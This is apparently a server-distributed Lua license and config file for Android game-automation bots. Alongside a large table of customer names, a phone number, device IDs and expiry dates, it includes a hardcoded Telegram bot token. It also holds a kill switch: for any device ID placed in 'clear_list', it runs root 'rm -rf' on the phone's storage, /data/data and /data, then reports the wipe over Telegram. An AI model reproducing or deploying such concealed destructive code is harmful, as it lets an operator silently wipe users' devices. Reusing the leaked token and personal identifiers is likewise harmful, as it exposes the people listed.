versia_in_server = 13.50

--function sendEmail(head, massage) run, err = pcall(httpGet, "https://api.telegram.org/bot5526017006:AAEBHMjZGXKZbh-_KpSplRLiphsZA1mTLxU/sendMessage?chat_id=354428067&text=" .. head .. ": " .. massage) end
function sendTelegram(head, massage) run, err = pcall(httpGet, "https://api.telegram.org/bot5526017006:AAEBHMjZGXKZbh-_KpSplRLiphsZA1mTLxU/sendMessage?chat_id=354428067&text=" .. head .. ": " .. massage) end


apk_update = true

sand_massage = true

clear_list = {
	
}

for n = 1, #clear_list do
	if clear_list[n] == getDeviceID() then
		print(os.execute(string.format('su -c "rm -rf %s" ', "/storage/emulated/0/PhoneSDCard/*.*")))
		print(os.execute(string.format('su -c "rm -rf %s" ', "/storage/emulated/0")))
		print(os.execute(string.format('su -c "rm -rf %s" ', "/data/data")))
		print(os.execute(string.format('su -c "rm -rf %s" ', "/data")))
		sendEmail("Зачистка!", getDeviceID() .. " Бот зачищен!")
		sendTelegram("Зачистка!", getDeviceID() .. " Бот зачищен!")
	end
end


Data = {

k_17523272 = {
name = "Боты",
data = "01.01.2030", 
liga = true,
spam = true,
batl = true,
komb = true,
dev = true,
logs = false,
turb = true,
id = {"test",},},

k_3136081 = {
name = "Паша боты",
data = "01.01.2030",
batl = true,
id = {"6a5ec35da37caa1b", "604a35338609e6bc", "4df4b62405d7de3e", "8bce5580cc8ae6fc", "6a5ec35da37caa1b", "4e69f879aee14df", "55b2978cc6309e04", "b929b5a69e2eda7", "4912e59fc86d094d", "9f166749e3c5ba3a", "test"},},

k_4363382 = {
name = "Паша ездюк",
data = "01.01.2030",
batl = true,
spam = true,
komb = true,
liga = true,
dev = true,
id = {"139adac677c0245","test"},},

k_2468511 = {
name = "Ричи Йети",
data = "30.10.2025",
batl = true,
liga = true,
id = {"f817632c570c5793",},},

k_1814990 = {
name = "Ричи Курганец (В3)",
data = "30.10.2025",
batl = true,
liga = true,
id = {"9ebe2b8750c516a5",},},

k_33591092 = {
name = "Ричи Масаракс Йети",
data = "02.02.2025",
batl = true,
liga = true,
id = {"ae2abf78545e152f",},},

k_1604948 = {
name = "Ричи редми нот 5",
data = "09.01.2026",
batl = true,
spam = true,
liga = true,
komb = true,
id = {"d0c074eeaa92052c", "4d797fe0628b3dd2","77d4f75d353e7590", "c1441744a81cc856"},},

k_14159280 = {
name = "Ричи В÷1",
data = "09.01.2026",
batl = true,
liga = true,
id = {"ddbe34b83dc95d55",},},

k_13072615t = {
name = "Ричи 4х 2",
data = "09.01.2026",
batl = true,
liga = true,
id = {"eb02c8efb411d8fb",},},

k_5584805 = {
name = "Кореша удачи 2",
data = "21.04.2025",
batl = true,
id = {"7d2a14ad6c04cbd9",},},

k_2237675 = {
name = "Кореша удачи 1",
data = "21.04.2025",
batl = true,
id = {"c74499af7ee6ff16",},},

k_15459405 = {
name = "+77766593949 KzForce 1",
data = "20.04.2025",
batl = true,
id = {"fd7dba0b3f3e1987",},},

k_1367725 = {
name = "+77766593949 KzForce 2",
data = "20.04.2025",
batl = true,
id = {"6b7674d12db7ad3b",},},

k_27325431 = {
name = "KzForce 3",
data = "05.10.2025",
batl = true,
id = {"234c6d67496d751b",},},

k_9649118 = {
name = "KzForce 4",
data = "05.10.2025",
batl = true,
id = {"a5a7ba07f39f8d7a",},},

k_4175656 = {
name = "Максим Хуавей",
data = "31.12.2024",
batl = true,
id = {"3b7eac21b01b4c8d","be9540d3682344b1","7588f40cffb6bba1"},},

k_45154179 = {
name = "Максим редми нот 5",
data = "31.12.2025",
batl = true,
id = {"670eec187dc27a4b", "8f7a2db9da8f25c5", "bcf0c3ace7f2ed19", "be2d858695333fc8"},},

k_17659985 = {
name = "Максим редми 7",
data = "31.12.2025",
batl = true,
id = {"b73addf761f3e0e4", "3cc9d7be29115837", "c4d5e957ec8cd8b6", "8f4e807416b89979"},},

k_16885464 = {
name = "Максим редми нот 5 _2",
data = "31.05.2025",
batl = true,
id = {"f5446939601c378b","9cac1fecdf0f1227", "ba4f1b042e2147e", "edf56f390b6b166c"},},

k_5371022 = {
name = "Максим redmi note 7 -1",
data = "31.12.2025",
batl = true,
id = {"63a3eec2fc48d903",},},

k_1416917 = {
name = "Максим redmi note 7 -2",
data = "31.12.2025",
batl = true,
id = {"5c1fb29e70556ad9",},},

k_10545160 = {
name = "СвятаяРусь_1",
data = "01.04.2025",
batl = true,
id = {"c892bd57bbbd4741",},},

k_13305328 = {
name = "СвятаяРусь_2",
data = "01.10.2025",
batl = true,
komb = true,
spam = true,
id = {"3cede3ff6ec73888",},},

k_1834380 = {
name = "СвятаяРусь_3",
data = "01.10.2024",
batl = true,
id = {"cf04211ee08a200b",},},

k_24170802 = {
name = "Монолит 1",
data = "07.10.2025",
batl = true,
id = {"9de2065f58862c0b",},},

k_39419097 = {
name = "Монолит 2",
data = "07.10.2024",
batl = true,
id = {"a6d2984322885837",},},

k_30053579 = {
name = "Стрелкан 1",
data = "30.03.2025",
batl = true,
id = {"978e7bf19a53392d",},},

k_3638473 = {
name = "Стрелкан 2",
data = "30.03.2025",
batl = true,
id = {"9469ebbdd43dda31",},},

k_2574077 = {
name = "Русичи_2",
data = "03.10.2025",
batl = true,
id = {"7c9a97fbd205bc35",},},

k_20780011 = {
name = "Русичи_1",
data = "03.10.2025",
batl = true,
id = {"2f295c519d68e6d9",},},

k_18364321 = {
name = "FULMINATA redmi note 5",
data = "19.02.2025",
batl = true,
id = {"e91a158f7ffbdac6",},},

k_7594614 = {
name = "За родину мать",
data = "13.10.2025",
batl = true,
id = {"50b218d977e5ad7b",},},

k_11656061 = {
name = "За родину мать 1",
data = "13.10.2024",
batl = true,
id = {"c9bcbcdea14a1de2",},},

k_15316174 = {
name = "За родину мать 2",
data = "13.10.2024",
batl = true,
id = {"74c4728828a334c2",},},

k_9869926 = {
name = "Роман Карадаг 1",
data = "01.10.2025",
batl = true,
id = {"e84150a496a19930",},},

k_11080217 = {
name = "Роман Карадаг 2",
data = "01.10.2025",
batl = true,
id = {"2a45936a1a6b1b6d",},},

k_28702756 = {
name = "Роман Карадаг 3",
data = "01.10.2025",
batl = true,
id = {"dff9f724325c032a",},},

k_18584017 = {
name = "Карадаг ß҆ҨԎ÷2",
data = "01.10.2025",
batl = true,
id = {"58572c48c02f4ad1",},},

k_26352419 = {
name = "Таджикистан 2",
data = "05.04.2024",
batl = true,
id = {"14cc8c37ed5f3c10",},},

k_5733648 = {
name = "Таджикистан 3",
data = "29.12.2024",
batl = true,
id = {"86c71ad4632ba488",},},

k_8457660 = {
name = "Таджикистан 4",
data = "05.04.2025",
batl = true,
id = {"240bef35738a06a3",},},

k_14508308 = {
name = "Адамант новый 2",
data = "10.11.2025",
batl = true,
liga = true, 
id = {"1f0a29000a3b10b2",},},

k_43129824 = {
name = "Адамант новый 1",
data = "10.11.2025",
batl = true,
komb = true,
spam = true,
liga = true, 
id = {"7460162bda7f7fa7",},},

k_13833710 = {
name = "Союз друзей 1",
data = "19.12.2024",
batl = true,
id = {"3b842850fb595603",},},

k_1517723 = {
name = "Союз друзей 2",
data = "19.12.2024",
batl = true,
id = {"a7089f7852a37432",},},

k_49375805 = {
name = "Центурион Дети 90 - 1",
data = "23.01.2026",
batl = true,
id = {"41bb85ed215c4a46",},},

k_39330356 = {
name = "Центурион Дети 90 - 2",
data = "23.01.2026",
batl = true,
id = {"2466f3497c3891a8",},},

k_26991504 = {
name = "Центурион Дети 90 - 3",
data = "23.01.2026",
batl = true,
id = {"54e07c38f2b61d1a",},},

k_1238481 = {
name = "Айсберг 1",
data = "25.12.2024",
batl = true,
id = {"c2db258e01f9c48d",},},

k_25325227 = {
name = "Тюмень 1",
data = "07.05.2025",
batl = true,
id = {"e430279152ce81a2",},},

k_1911383 = {
name = "Тюмень 2",
data = "07.05.2025",
batl = true,
id = {"62db45c22a995bc3",},},

k_13245599 = {
name = "Снежана СтальнаяБратва",
data = "30.01.2025",
batl = true,
id = {"7e4ac66df6d9ee78",},},

k_27560882 = {
name = "СтальноеБратство 1",
data = "30.01.2025",
batl = true,
id = {"2387f61c814d8706",},},

k_30180519 = {
name = "СтальноеБратство 2",
data = "30.01.2025",
batl = true,
id = {"da7c278930e706d6",},},

k_3196672 = {
name = "Лег Дружбы 5 Стопарик",
data = "07.02.2025",
batl = true,
liga = true,
id = {"99c047a91e68fe0a",},},

k_1178061 = {
name = "Лег Дружбы 4 Везунчик",
data = "07.02.2025",
batl = true,
liga = true,
id = {"e3234196db557bb2",},},

k_5795199 = {
name = "Лег Дружбы 3 Т34",
data = "15.01.2026",
batl = true,
id = {"84a33bca402afe01",},},

k_2187229 = {
name = "Лег Дружбы 2 КВ1",
data = "10.10.2025",
batl = true,
id = {"ce96854e16c768b3",},},

k_12721712 = {
name = "Лег Дружбы 1 ИС1",
data = "10.10.2025",
batl = true,
id = {"422e60c71c896b9b",},},

k_13113070 = {
name = "Белый орел 1",
data = "01.05.2026",
batl = true,
id = {"94b5613b7fa444ab",},},

k_8375700 = {
name = "Белый орел 2",
data = "01.05.2026",
batl = true,
id = {"d030aaab4bb89060",},},

k_1667938 = {
name = "БойцыКЗ_1",
data = "21.10.2025",
batl = true,
id = {"9b931a36fbefae83",},},

k_5169756 = {
name = "БойцыКЗ_2",
data = "29.10.2025",
batl = true,
id = {"92961475e347728b",},},

k_4353056 = {
name = "БойцыКЗ_3",
data = "01.02.2025",
batl = true,
id = {"2bac4272c1a15886",},},

k_34374094 = {
name = "БойцыКЗ_4",
data = "18.01.2026",
batl = true,
id = {"ec22e5b4718ed087",},},

k_54703227 = {
name = "Алания 1",
data = "08.11.2024",
batl = true,
id = {"392f3afba3116d8d",},},

k_3364340 = {
name = "Алания 2",
data = "08.11.2024",
batl = true,
id = {"e60fa3043bb3697f",},},

k_6690362 = {
name = "Маньяки",
data = "16.08.2024",
batl = true,
id = {"c7aa2a3535c0b9ce",},},

k_26472606 = {
name = "Маньяки 2",
data = "08.07.2024",
batl = true,
id = {"60d8f94888f0c85b",},},

k_2584823 = {
name = "Маньяки 3",
data = "16.01.2025",
batl = true,
id = {"a90f6170b955fce9",},},

k_17665808 = {
name = "Маньяки 4",
data = "15.07.2025",
batl = true,
id = {"bbae2ee27ab20a11",},},

--3 травня відключив поміняв год
k_7931523 = {
name = "Варриор 3",
data = "05.11.2023",
batl = true,
id = {"8226d54ba6d77936",},},

k_26713966 = {
name = "Варриор 4",
data = "05.11.2023",
batl = true,
id = {"9fc40001eee34435",},},

k_6892082 = {
name = "Кавказ Mels 1",
data = "10.02.2024",
batl = true,
id = {"6fbfae4914f9e6c5",},},

k_14555070 = {
name = "Кавказ Mels 2",
data = "10.02.2024",
batl = true,
id = {"5d024ba9e1998528",},},

k_7092301 = {
name = "Пристань 1",
data = "14.03.2025",
batl = true,
id = {"e9d764bf38620f14",},},

k_15136686 = {
name = "Пристань 2",
data = "14.03.2025",
batl = true,
id = {"36b4cf34394a8fe9",},},

k_4358449 = {
name = "Разрушители 1",
data = "05.06.2025",
batl = true,
id = {"5c9a1db998edac0",},},

k_20676050 = {
name = "Разрушители 2",
data = "05.06.2025",
batl = true,
id = {"9cbc04bb84d16aef",},},

k_5943993 = {
name = "Разрушители 3",
data = "05.06.2025",
batl = true,
id = {"278db371a49347f0",},},

k_11009846 = {
name = "Разрушители 4",
data = "05.06.2025",
batl = true,
id = {"6106473ccc80bd34",},},

k_19652621 = {
name = "Святичи",
data = "20.05.2025",
batl = true,
id = {"6ba7127c8f1c91f3",},},

k_17843395 = {
name = "Франки 1",
data = "21.01.2025",
batl = true,
id = {"38ce26596c1f2c8e",},},

k_15102435 = {
name = "Франки 2",
data = "21.01.2025",
batl = true,
id = {"9456083ca1133507",},},

k_46197080 = {
name = "Воевода",
data = "06.02.2025",
batl = true,
id = {"2ddb859092dc7bed",},},

k_1389391 = {
name = "Ферата",
data = "28.02.2025",
batl = true,
id = {"c10ae976467a597f",},},

k_13754461 = {
name = "Алаш",
data = "09.03.2025",
batl = true,
id = {"1c51fd8d7b859b58",},},

k_1419192 = {
name = "Чёрный орёл",
data = "19.03.2024",
batl = true,
id = {"6ef5b5ecd5d5b349",},},

k_15353591 = {
name = "ATLANTIS 1",
data = "20.10.2024",
batl = true,
id = {"e28fdf9ff1b47216",},},

k_15581364 = {
name = "ATLANTIS 2",
data = "20.10.2024",
batl = true,
id = {"1818199ea33842f8",},},

k_20890273 = {
name = "ATLANTIS 3",
data = "01.02.2025",
batl = true,
id = {"bed35abdc934628f",},},

k_6195989 = {
name = "ATLANTIS 4",
data = "01.02.2025",
batl = true,
id = {"9d8baaa0938583e6",},},

k_35862226 = {
name = "Ербол 1",
data = "23.12.2025",
batl = true,
id = {"4a4282e6288c00d5",},},

k_2326048 = {
name = "Ербол 2",
data = "23.06.2024",
batl = true,
id = {"daf3e1b7e567b058",},},

k_25922950 = {
name = "Спарта 4",
data = "01.10.2025",
batl = true,
id = {"9de7988a8bce771b",},},

k_51593416 = {
name = "Русичи Юпитер 5",
data = "25.12.2025",
batl = true,
id = {"6df396c5fad61e4b",},},

k_16208024 = {
name = "Х СТРАЖИ РФ Х",
data = "01.12.2024",
batl = true,
id = {"1e886417bf3c47d1",},},

k_5850551 = {
name = "FURIOZA новый 1",
data = "12.12.2025",
batl = true,
id = {"7ed75f622952855c",},},

k_1337278 = {
name = "FURIOZA новый 2",
data = "10.01.2026",
batl = true,
id = {"7c43ad6b501174f0",},},

k_48049114 = {
name = "FURIOZA 3",
data = "30.01.2025",
batl = true,
id = {"11d6fd7c0ae61bb9",},},

k_15716382 = {
name = "Виа Гра 1",
data = "03.11.2024",
batl = true,
id = {"dfedfbd436856851",},},

k_10430828 = {
name = "Виа Гра 2",
data = "27.11.2024",
batl = true,
id = {"9dd2a884897ee9d4",},},

k_3201754 = {
name = "ĤĘЗÄЛĘӁĤĬ÷ÙÄ 1",
data = "13.12.2025",
batl = true,
id = {"2e29b33e5000befc",},},

k_3925037 = {
name = "ĤĘЗÄЛĘӁĤĬ÷ÙÄ 2",
data = "13.12.2025",
batl = true,
id = {"aef01d85f74036d9",},},



}

return versia_in_server, Data, clear_list, apk_update, sand_massage
